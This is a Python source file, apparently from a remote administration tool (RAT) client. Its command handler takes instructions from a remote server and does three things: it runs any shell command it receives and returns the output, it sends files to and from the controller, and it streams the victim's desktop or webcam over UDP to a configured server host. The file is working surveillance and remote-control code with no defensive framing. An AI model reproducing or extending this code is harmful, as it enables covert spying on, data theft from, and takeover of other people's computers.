from subprocess import check_output, CalledProcessError, STDOUT, Popen
import json, threading, logging, os, random


# my modules
from core.settings import ENCODING, STREAM_PORT, SOCK_SRV, DEFAULT_SAVING_DIR
from extras.info import Info

ffmpeg_proc = None
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

def execute_cmd(cmd, ftp_client):
    global ffmpeg_proc

    try:
        if cmd.startswith("-get"):
            path = cmd.split(" ")[1]
            if os.path.exists(path):
                ftp_client.to_send_file_path = path
                logger.info("get_file operation : path={} exists".format(path))
                res_cmd = "__tSize__{}".format(os.path.getsize(path))
            else:
                res_cmd = "__tSize__-1"

        elif cmd.startswith("-send") :
            cmd_args = cmd.split(" ")
            ftp_client.to_get_file_size = int(cmd_args[len(cmd_args)-1].split("_size==")[1])
            if len(cmd_args) == 4 :
                ftp_client.to_get_file_sLoc = os.path.join(cmd_args[2], os.path.basename(cmd_args[1]))
            else:
                if not os.path.exists(os.path.basename(cmd_args[1])) :
                    ftp_client.to_get_file_sLoc = os.path.basename(cmd_args[1])
                else:
                    ftp_client.to_get_file_sLoc = str(random.random())+"_"+os.path.basename(cmd_args[1])

            #if not os.path.exists(os.path.dirname(ftp_client.to_get_file_sLoc)):
            ftp_client.get_async()
            res_cmd = ""

        elif cmd.startswith("__stream__"):
            stream_para = json.loads(cmd.split("__stream__")[1].replace("'",'"'))

            if ffmpeg_proc :
                print("Already running stream")
                return "__sys__Stream is already running"
            
            # ffmpeg command
            if stream_para["dev"] == "desktop":
                ffmpeg = "ffmpeg -loglevel panic -f gdigrab -i {} -vf scale={} -framerate {} -f mpegts -codec:v mpeg1video -q {} -f mpegts udp://{}:{}?pkt_size=188?buffer_size=65535" \
                .format(stream_para["dev"], stream_para["reso"], stream_para["frate"], stream_para["q"], SOCK_SRV, STREAM_PORT)
            else:
                ffmpeg = 'ffmpeg -loglevel panic -f dshow -i video="{}" -framerate {} -s {} -f mpegts -codec:v mpeg1video -q {} -f mpegts udp://{}:{}?pkt_size=188?buffer_size=65535' \
                .format(stream_para["dev"], stream_para["frate"], stream_para["reso"], stream_para["q"], SOCK_SRV, STREAM_PORT)

            ffmpeg_proc = Popen(ffmpeg, shell= False)
            res_cmd = "__sys__Started Stream"

        elif cmd == "__stopStream__":
            if ffmpeg_proc is not None :
                ffmpeg_proc.terminate()
                ffmpeg_proc = None
                res_cmd = "__sys__Stopped Stream"
            else :
                print("trying to stop non running stream !")

        elif cmd.startswith("cd"):
            if len(cmd) > 3 :
                os.chdir(cmd[3:])
                res_cmd = "Executing '{}' DONE".format(cmd)

        elif cmd.startswith("_custom_"):
            info = cmd.split("_custom_")[1].strip()
            print("ok")
            if info == "installed_softs":
                res_cmd = json.dumps(Info.get_installed_softs())
                print(len(res_cmd))

        else :
            
            try :
                res_cmd = check_output(cmd,stderr=STDOUT,shell=True)
                
            except CalledProcessError as e:
                return "__err__{}".format(e.output.decode(ENCODING))
            
            if len(res_cmd) == 0 :
               res_cmd = "Executing '{}' DONE".format(cmd)
            else :
                res_cmd = res_cmd.decode(ENCODING)

    except Exception as e:
        res_cmd = "__err__{}".format(str(e))

    return res_cmd

